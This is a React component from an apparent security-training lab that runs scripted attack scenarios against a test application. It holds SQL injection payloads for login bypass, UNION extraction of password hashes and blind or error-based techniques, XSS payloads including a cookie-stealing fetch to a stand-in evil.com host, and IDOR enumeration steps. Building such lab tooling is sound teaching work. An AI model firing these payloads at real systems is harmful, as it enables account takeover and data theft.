import React, { useState, useEffect } from 'react';
import { TestResult } from './SecurityLabDashboard';

interface AttackTestingDashboardProps {
  vulnerabilityType: string;
  onTest: (vulnType: string, payload: string, target?: string) => Promise<TestResult>;
}

interface AttackScenario {
  id: string;
  name: string;
  description: string;
  steps: {
    step: number;
    description: string;
    payload: string;
    expectedResult: 'VULNERABLE' | 'SECURE';
    automated: boolean;
  }[];
}

export const AttackTestingDashboard: React.FC<AttackTestingDashboardProps> = ({
  vulnerabilityType,
  onTest
}) => {
  const [scenarios, setScenarios] = useState<AttackScenario[]>([]);
  const [activeScenario, setActiveScenario] = useState<string | null>(null);
  const [currentStep, setCurrentStep] = useState(0);
  const [scenarioResults, setScenarioResults] = useState<Record<string, TestResult[]>>({});
  const [isRunning, setIsRunning] = useState(false);

  useEffect(() => {
    setScenarios(getAttackScenarios());
  }, [vulnerabilityType]);

  const getAttackScenarios = (): AttackScenario[] => {
    switch (vulnerabilityType) {
      case 'sqlInjection':
        return [
          {
            id: 'sql-basic',
            name: 'Basic SQL Injection Assessment',
            description: 'Test fundamental SQL injection vulnerabilities',
            steps: [
              {
                step: 1,
                description: 'Test for basic SQL injection vulnerability',
                payload: "' OR '1'='1",
                expectedResult: 'VULNERABLE',
                automated: true
              },
              {
                step: 2,
                description: 'Attempt authentication bypass',
                payload: "admin'--",
                expectedResult: 'VULNERABLE',
                automated: true
              },
              {
                step: 3,
                description: 'Extract user data with UNION attack',
                payload: "' UNION SELECT id, email, password_hash FROM users--",
                expectedResult: 'VULNERABLE',
                automated: true
              },
              {
                step: 4,
                description: 'Test for database schema discovery',
                payload: "' UNION SELECT table_name, column_name, data_type FROM information_schema.columns--",
                expectedResult: 'VULNERABLE',
                automated: true
              }
            ]
          },
          {
            id: 'sql-advanced',
            name: 'Advanced SQL Injection Techniques',
            description: 'Test advanced SQL injection attack vectors',
            steps: [
              {
                step: 1,
                description: 'Blind SQL injection with time delay',
                payload: "'; WAITFOR DELAY '00:00:05'--",
                expectedResult: 'VULNERABLE',
                automated: true
              },
              {
                step: 2,
                description: 'Boolean-based blind injection',
                payload: "' AND (SELECT COUNT(*) FROM users) > 0--",
                expectedResult: 'VULNERABLE',
                automated: true
              },
              {
                step: 3,
                description: 'Error-based information disclosure',
                payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                expectedResult: 'VULNERABLE',
                automated: true
              }
            ]
          }
        ];

      case 'xss':
        return [
          {
            id: 'xss-stored',
            name: 'Stored XSS Assessment',
            description: 'Test for persistent XSS vulnerabilities',
            steps: [
              {
                step: 1,
                description: 'Basic script injection test',
                payload: "<script>alert('XSS')</script>",
                expectedResult: 'VULNERABLE',
                automated: true
              },
              {
                step: 2,
                description: 'Image-based XSS payload',
                payload: "<img src=x onerror='alert(\"XSS via image\")'>",
                expectedResult: 'VULNERABLE',
                automated: true
              },
              {
                step: 3,
                description: 'SVG-based XSS payload',
                payload: "<svg onload='alert(\"XSS via SVG\")'>",
                expectedResult: 'VULNERABLE',
                automated: true
              },
              {
                step: 4,
                description: 'Session hijacking simulation',
                payload: "<script>fetch('/evil.com/steal?cookie='+document.cookie)</script>",
                expectedResult: 'VULNERABLE',
                automated: true
              }
            ]
          }
        ];

      case 'idor':
        return [
          {
            id: 'idor-horizontal',
            name: 'Horizontal Privilege Escalation',
            description: 'Test access to other users\' resources',
            steps: [
              {
                step: 1,
                description: 'Access task with incremented ID',
                payload: 'Increment task ID by 1',
                expectedResult: 'VULNERABLE',
                automated: false
              },
              {
                step: 2,
                description: 'Access task with decremented ID',
                payload: 'Decrement task ID by 1',
                expectedResult: 'VULNERABLE',
                automated: false
              },
              {
                step: 3,
                description: 'Bulk enumeration test',
                payload: 'Test IDs 1-100 systematically',
                expectedResult: 'VULNERABLE',
                automated: true
              }
            ]
          }
        ];

      default:
        return [];
    }
  };

  const runScenario = async (scenarioId: string) => {
    const scenario = scenarios.find(s => s.id === scenarioId);
    if (!scenario) return;

    setActiveScenario(scenarioId);
    setCurrentStep(0);
    setIsRunning(true);

    const results: TestResult[] = [];

    for (let i = 0; i < scenario.steps.length; i++) {
      const step = scenario.steps[i];
      setCurrentStep(i);

      if (step.automated) {
        try {
          const result = await onTest(vulnerabilityType, step.payload);
          results.push(result);
          
          // Add delay between automated steps
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (error) {
          console.error(`Step ${step.step} failed:`, error);
        }
      } else {
        // For manual steps, just log the instruction
        console.log(`Manual step ${step.step}: ${step.description}`);
      }
    }

    setScenarioResults(prev => ({
      ...prev,
      [scenarioId]: results
    }));

    setIsRunning(false);
    setActiveScenario(null);
  };

  const getStepStatus = (scenarioId: string, stepIndex: number) => {
    const results = scenarioResults[scenarioId];
    if (!results || !results[stepIndex]) return 'pending';
    
    const result = results[stepIndex];
    return result.result === 'VULNERABLE' ? 'success' : 'blocked';
  };

  return (
    <div className="space-y-6">
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
        <h3 className="text-lg font-semibold text-blue-900 mb-2">
          🧪 Automated Attack Testing
        </h3>
        <p className="text-blue-800 text-sm">
          Run comprehensive attack scenarios to test vulnerability implementations.
          Each scenario includes multiple attack vectors and techniques.
        </p>
      </div>

      {/* Scenario List */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {scenarios.map((scenario) => (
          <div key={scenario.id} className="bg-white border border-gray-200 rounded-lg p-4">
            <div className="flex items-start justify-between mb-3">
              <div>
                <h4 className="font-semibold text-gray-900">{scenario.name}</h4>
                <p className="text-sm text-gray-600 mt-1">{scenario.description}</p>
              </div>
              <button
                onClick={() => runScenario(scenario.id)}
                disabled={isRunning}
                className={`
                  px-3 py-1 rounded text-sm font-medium transition-colors
                  ${isRunning
                    ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
                    : 'bg-red-600 hover:bg-red-700 text-white'
                  }
                `}
              >
                {isRunning && activeScenario === scenario.id ? 'Running...' : 'Run Test'}
              </button>
            </div>

            {/* Steps */}
            <div className="space-y-2">
              {scenario.steps.map((step, stepIndex) => (
                <div
                  key={stepIndex}
                  className={`
                    p-2 rounded border text-sm
                    ${activeScenario === scenario.id && currentStep === stepIndex
                      ? 'border-blue-300 bg-blue-50'
                      : 'border-gray-200 bg-gray-50'
                    }
                  `}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-medium">Step {step.step}: {step.description}</span>
                    <div className="flex items-center space-x-2">
                      {step.automated && (
                        <span className="text-xs bg-green-100 text-green-800 px-2 py-1 rounded">
                          AUTO
                        </span>
                      )}
                      {(() => {
                        const status = getStepStatus(scenario.id, stepIndex);
                        if (status === 'success') {
                          return <span className="text-green-600">✓</span>;
                        } else if (status === 'blocked') {
                          return <span className="text-red-600">✗</span>;
                        } else if (activeScenario === scenario.id && currentStep === stepIndex) {
                          return <span className="text-blue-600">⟳</span>;
                        }
                        return <span className="text-gray-400">○</span>;
                      })()}
                    </div>
                  </div>
                  <code className="block mt-1 text-xs text-gray-600 font-mono">
                    {step.payload}
                  </code>
                </div>
              ))}
            </div>

            {/* Results Summary */}
            {scenarioResults[scenario.id] && (
              <div className="mt-3 pt-3 border-t">
                <div className="flex items-center justify-between text-sm">
                  <span className="text-gray-600">Results:</span>
                  <div className="flex space-x-2">
                    <span className="text-green-600">
                      ✓ {scenarioResults[scenario.id].filter(r => r.result === 'VULNERABLE').length}
                    </span>
                    <span className="text-red-600">
                      ✗ {scenarioResults[scenario.id].filter(r => r.result === 'SECURE').length}
                    </span>
                  </div>
                </div>
              </div>
            )}
          </div>
        ))}
      </div>

      {/* Real-time Progress */}
      {isRunning && activeScenario && (
        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
          <div className="flex items-center space-x-3">
            <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-yellow-600"></div>
            <div>
              <h4 className="font-medium text-yellow-900">
                Running: {scenarios.find(s => s.id === activeScenario)?.name}
              </h4>
              <p className="text-sm text-yellow-700">
                Step {currentStep + 1} of {scenarios.find(s => s.id === activeScenario)?.steps.length}
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Instructions */}
      <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
        <h4 className="font-medium text-gray-900 mb-2">📋 Testing Instructions</h4>
        <ul className="text-sm text-gray-700 space-y-1">
          <li>• <strong>Automated steps</strong> will run automatically when you click "Run Test"</li>
          <li>• <strong>Manual steps</strong> require you to perform actions in the application</li>
          <li>• Results show ✓ for successful exploits and ✗ for blocked attempts</li>
          <li>• Each scenario tests different aspects of the vulnerability</li>
        </ul>
      </div>
    </div>
  );
};